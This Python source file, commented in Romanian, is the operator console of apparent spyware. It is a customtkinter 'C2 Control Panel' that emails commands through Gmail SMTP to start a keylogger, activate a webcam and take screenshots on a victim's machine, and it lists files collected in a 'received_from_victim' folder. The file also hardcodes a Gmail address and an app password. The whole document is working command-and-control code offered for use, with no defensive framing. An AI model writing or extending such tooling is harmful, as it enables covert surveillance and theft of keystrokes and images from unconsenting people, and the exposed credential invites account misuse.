
import smtplib
import threading
import time
import customtkinter as ctk
from datetime import datetime
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ====================== CONFIGURARE EMAIL ======================
EMAIL_CONFIG = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'sender_email': 'romanbogdan475@gmail.com',      # Folosește acest cont
    'sender_password': 'cxzv ddop qosk hvdy',        # App Password-ul tău
}

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class EmailC2:
    def __init__(self):
        self.save_dir = "received_from_victim"
        os.makedirs(self.save_dir, exist_ok=True)

    def send_command(self, command):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_CONFIG['sender_email']
            msg['To'] = EMAIL_CONFIG['sender_email']      # Trimite către același cont
            msg['Subject'] = f"COMMAND: {command}"
            msg.attach(MIMEText(f"Command: {command}\nSent at: {datetime.now()}", 'plain'))

            with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port']) as server:
                server.starttls()
                server.login(EMAIL_CONFIG['sender_email'], EMAIL_CONFIG['sender_password'])
                server.send_message(msg)

            print(f"[+] Comandă trimisă: {command}")
            return True
        except Exception as e:
            print(f"[-] Eroare la trimitere: {e}")
            return False


class C2GUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("C2 Control Panel")
        self.geometry("820x780")

        self.c2 = EmailC2()

        self.create_widgets()
        self.check_received_periodically()

    def create_widgets(self):
        ctk.CTkLabel(self, text="C2 Control Panel", 
                     font=ctk.CTkFont(size=28, weight="bold")).pack(pady=20)

        self.status_label = ctk.CTkLabel(self, text="Ready", 
                                         font=ctk.CTkFont(size=14))
        self.status_label.pack(pady=10)

        # Set Recipient
        recipient_frame = ctk.CTkFrame(self)
        recipient_frame.pack(pady=10, padx=80, fill="x")

        ctk.CTkLabel(recipient_frame, text="Adresă de recepție:", 
                     font=ctk.CTkFont(size=14)).pack(pady=(10,5))

        self.recipient_entry = ctk.CTkEntry(recipient_frame, height=40, 
                                           placeholder_text="Introdu adresa de email aici...")
        self.recipient_entry.pack(pady=5, padx=20, fill="x")

        ctk.CTkButton(recipient_frame, text="Set Recipient Email", height=40, fg_color="orange",
                      command=self.set_recipient).pack(pady=10)

        # Butoane
        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(pady=20, padx=80, fill="x")

        buttons = [
            ("▶ Start Keylogger", "green", "START_KEYLOGGER"),
            ("■ Stop Keylogger", "red", "STOP_KEYLOGGER"),
            ("📸 Start Webcam", "green", "START_CAMERA"),
            ("📸 Stop Webcam", "red", "STOP_CAMERA"),
            ("📸 Take Screenshot", "blue", "TAKE_SCREENSHOT"),
            ("▶ Start Auto Screenshot", "green", "START_SCREENSHOT"),
            ("■ Stop Auto Screenshot", "red", "STOP_SCREENSHOT"),
        ]

        for text, color, cmd in buttons:
            btn = ctk.CTkButton(btn_frame, text=text, height=50, fg_color=color,
                                command=lambda c=cmd: self.send_command(c))
            btn.pack(pady=6, fill="x")

        # Fișiere primite
        files_frame = ctk.CTkFrame(self)
        files_frame.pack(pady=20, padx=80, fill="both", expand=True)

        ctk.CTkLabel(files_frame, text="Fișiere primite:", 
                     font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)

        self.files_textbox = ctk.CTkTextbox(files_frame, height=260)
        self.files_textbox.pack(fill="both", expand=True, padx=15, pady=10)

        self.update_files_display()

    def set_recipient(self):
        email = self.recipient_entry.get().strip()
        if email and "@" in email:
            self.c2.send_command(f"SET_RECIPIENT:{email}")
            self.status_label.configure(text=f"✅ Adresă setată: {email}")
        else:
            self.status_label.configure(text="❌ Introduce o adresă validă!")

    def send_command(self, command):
        self.status_label.configure(text=f"📤 Se trimite: {command} ...")
        success = self.c2.send_command(command)
        if success:
            self.status_label.configure(text=f"✅ Trimis: {command}")
        else:
            self.status_label.configure(text="❌ Eroare la trimitere")

    def update_files_display(self):
        self.files_textbox.delete("1.0", "end")
        if os.path.exists("received_from_victim"):
            files = os.listdir("received_from_victim")
            if files:
                for f in sorted(files, reverse=True):
                    self.files_textbox.insert("end", f"📄 {f}\n")
            else:
                self.files_textbox.insert("end", "Încă nu au sosit date...\n")
        else:
            self.files_textbox.insert("end", "Folderul 'received_from_victim' nu există.\n")

    def check_received_periodically(self):
        def loop():
            while True:
                self.update_files_display()
                time.sleep(30)
        threading.Thread(target=loop, daemon=True).start()


if __name__ == "__main__":
    app = C2GUI()
    app.mainloop()